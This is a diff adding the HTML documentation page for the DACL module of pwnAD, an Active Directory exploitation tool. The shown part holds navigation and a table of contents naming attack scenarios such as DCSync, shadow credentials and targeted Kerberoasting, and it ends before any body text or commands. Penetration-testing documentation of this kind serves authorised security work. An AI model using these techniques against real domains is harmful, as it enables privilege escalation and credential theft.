@@ -1,0 +1,1845 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Active Directory exploitation tool focusing on LDAP and Kerberos protocols">
+      
+      
+        <meta name="author" content="LightxR">
+      
+      
+        <link rel="canonical" href="https://lightxr.github.io/pwnAD/modules/dacl/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>DACL (Discretionary Access Control Lists) - pwnAD</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#dacl-discretionary-access-control-lists" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="pwnAD" class="md-header__button md-logo" aria-label="pwnAD" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            pwnAD
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              DACL (Discretionary Access Control Lists)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/LightxR/pwnAD" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    LightxR/pwnAD
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../installation/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Installation
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../authentication/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Authentication
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../interactive-mode/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Interactive Mode
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../commands/" class="md-tabs__link">
+          
+  
+  
+  Commands
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+  Modules
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../kerberos/" class="md-tabs__link">
+          
+  
+  
+  Kerberos
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../troubleshooting/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Troubleshooting
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="pwnAD" class="md-nav__button md-logo" aria-label="pwnAD" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    pwnAD
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/LightxR/pwnAD" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    LightxR/pwnAD
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../installation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Installation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../interactive-mode/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Interactive Mode
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Commands
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Commands
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../commands/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../commands/add/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    add
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../commands/remove/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    remove
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../commands/get/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    get
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../commands/modify/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    modify
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../commands/query/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    query
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modules
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modules
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../shadow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shadow Credentials
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Kerberos
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../kerberos/getTGT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    getTGT
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../kerberos/getST/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    getST
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../kerberos/getNThash/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    getNThash
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../troubleshooting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Troubleshooting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#requirements" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Requirements
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Usage
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#subcommands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Subcommands
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#available-rights" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Available Rights
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#subcommand-details" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Subcommand Details
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Subcommand Details">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#read" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        read
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#write" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        write
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remove" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        remove
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#backup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        backup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#restore" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        restore
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Scenarios
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Scenarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scenario-1-dcsync-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 1: DCSync Attack
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-2-password-reset-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 2: Password Reset Chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-3-group-membership-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 3: Group Membership Abuse
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-4-shadow-credentials-via-dacl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 4: Shadow Credentials via DACL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-5-targeted-kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario 5: Targeted Kerberoasting
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#interactive-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Interactive Mode
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Troubleshooting
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Troubleshooting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cannot-read-ntsecuritydescriptor-attribute-insufficient-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        "Cannot read nTSecurityDescriptor attribute (insufficient permissions?)"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#access-denied-when-writing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        "Access denied" when writing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unknown-right-xxx" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        "Unknown right: xxx"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#no-matching-aces-found-for-principal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        "No matching ACEs found for principal"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#object-not-found" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        "Object not found"
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Best Practices
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
